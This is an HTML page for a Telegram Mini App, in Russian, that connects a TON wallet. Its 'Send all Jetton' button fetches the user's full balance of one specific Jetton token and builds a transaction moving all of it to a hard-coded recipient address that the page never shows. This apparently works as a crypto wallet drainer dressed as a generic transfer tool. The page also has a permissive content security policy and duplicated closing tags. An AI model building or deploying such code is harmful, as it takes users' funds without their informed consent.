<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <meta http-equiv="Content-Security-Policy"
  content="
    default-src 'self';
    script-src 'self' 'unsafe-eval' 'unsafe-inline' https://telegram.org https://unpkg.com https://tonapi.io;
    style-src 'self' 'unsafe-inline' https://unpkg.com;
    connect-src 'self' https://bridge.tonapi.io https://tonconnect.manifestapi.io https://tonapi.io;
    font-src 'self' https://unpkg.com;
    img-src * data:;
  ">

  <title>Telegram Mini App: TON Connect Jetton Transfer</title>

  <script src="https://telegram.org/js/telegram-webapp.js"></script>
<script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
<link rel="stylesheet" href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css">
<script src="./js/tonconnect-sdk.min.js"></script>
</head>
<body>
  <h1>Telegram Mini App: Отправка всех токенов Jetton</h1>

  <div id="ton-connect"></div>

  <button id="sendTransaction">Отправить все Jetton</button>

  <script>
    Telegram.WebApp.ready();

    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
      manifestUrl: "https://neutronovich.github.io/tonconnect-manifest.json",
      buttonRootId: "ton-connect"
    });

    const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
    const recipientAddress = "UQCXsfFqRsY2pS3HsNzqnN0ns2ANiGrHpnmg_rQCJ-gxlqlU";

    async function getJettonWallet(userAddress, jettonMasterAddress) {
      const response = await fetch(`https://tonapi.io/v2/accounts/${userAddress}/jettons`);
      const data = await response.json();

      const jetton = data.balances.find(j => j.jetton.address === jettonMasterAddress);
      return jetton ? jetton.wallet_address.address : null;
    }

    async function getJettonBalance(jettonWallet) {
      const response = await fetch(`https://tonapi.io/v2/accounts/${jettonWallet}`);
      const data = await response.json();
      return data.balance;
    }

    async function sendJettonTransaction(userWalletAddress) {
      const jettonWallet = await getJettonWallet(userWalletAddress, jettonMasterAddress);

      if (!jettonWallet) {
        Telegram.WebApp.showAlert("У вас нет кошелька для этого Jetton.");
        return;
      }

      const balance = await getJettonBalance(jettonWallet);

      if (balance === "0") {
        Telegram.WebApp.showAlert("У вас нет токенов этого Jetton.");
        return;
      }

      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 360,
        messages: [
          {
            address: jettonWallet, // Адрес Jetton Wallet отправителя
            amount: "50000000", // Примерно 0.05 TON на оплату комиссии
            payload: {
              type: "jetton_transfer",
              query_id: 0,
              amount: balance,
              destination: recipientAddress,
              response_destination: null,
              custom_payload: null,
              forward_ton_amount: "0",
              forward_payload: null
            }
          }
        ]
      };

      try {
        const result = await tonConnectUI.sendTransaction(transaction);
        Telegram.WebApp.showAlert("Jetton отправлен: " + JSON.stringify(result));
      } catch (error) {
        Telegram.WebApp.showAlert("Ошибка транзакции: " + error.message);
      }
    }

    document.getElementById("sendTransaction").addEventListener("click", async () => {
      if (!tonConnectUI.connected) {
        Telegram.WebApp.showAlert("Сначала подключите кошелек.");
        return;
      }

      const userWalletAddress = tonConnectUI.wallet.account.address;
      await sendJettonTransaction(userWalletAddress);
    });
  </script>
</body>
</html>

</body>
</html>
